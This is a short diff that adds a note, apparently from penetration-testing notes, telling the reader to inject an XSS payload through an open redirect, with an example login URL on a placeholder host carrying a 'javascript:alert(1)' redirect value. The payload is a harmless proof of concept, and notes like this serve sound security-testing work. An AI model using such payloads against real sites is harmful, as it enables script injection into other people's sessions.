@@ -1,0 +1,3 @@
+Inject an XSS payload inside the open redirect like this: 
+
+https://target.com/login?redirect_url=javascript:alert(1) 
